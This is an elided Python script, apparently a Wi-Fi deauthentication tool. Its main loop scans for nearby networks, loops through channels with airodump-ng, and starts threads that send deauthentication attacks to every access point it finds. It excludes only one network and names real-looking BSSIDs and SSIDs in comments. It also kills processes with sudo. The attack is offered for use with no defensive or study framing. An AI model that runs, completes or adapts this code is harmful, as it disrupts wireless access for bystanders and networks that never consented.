...
def execute_timeout(cmd, verbose=False):
    p = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    out = []
    count = 0
    while True:
        ...
        if count >100:
            ...
            #print("sudo kill -9 {} ".format(p.pid))
            result = subprocess.check_output("sudo kill -9 {} ".format(p.pid+1), shell=True)
            result = subprocess.check_output("sudo kill -9 {} ".format(p.pid), shell=True)
            #p.terminate()
            #p.kill()
            break
        #print(line)
...
class sniffWifi(object):
    ...
    def stopFilter(self, x): #Stop the Sniffing if packet reachs the count
        ...
        sys.stdout.flush()
        #print(self.pktlimit , self.pktcount)
...
def change_monitor_channel(channel, monIface):
    cmd = "airodump-ng -c {} {} ".format( channel, monIface)
    print("change_monitor_channel:", cmd)
    exit_status = execute_timeout(cmd)
    #print(exit_status, cmd)
...
if __name__ == '__main__':
    ...
    while True:
        try:
            networks = iw_parse.get_interfaces(interface='mlan0')
            for ch in range(1,12):
            #for ch in [2,3,4,5,7,8,9,10]:
                threads = []
                for a in networks:
                    channel = int(a["Channel"])
                    #if  channel<11 and channel!=1 and channel!=6 :
                    if  a["Name"]!="ggggg" and channel==ch :
                        print(a["Name"], a["Channel"], a["Address"], Interface.monIface)
                        wifi = [a["Address"], a["Name"]]
                        t = threading.Thread(target=send_deauth_one, args=(wifi, Interface.monIface)) # 將 data 與 queue 傳入 thread 裡面
                        threads.append(t)
                        
                if len(threads)>0:
                    change_monitor_channel(ch, Interface.monIface)
                else:
                    continue
    ...
    #wifi =  ['b0:c7:45:ac:1c:c8', 'OVDemo3']
    #wifi =  ['A8:15:4D:B1:86:BC', 'Formosa-5G']
    #send_deauth(wifi, Interface.monIface)
    #send_deauth_one(wifi, Interface.monIface)
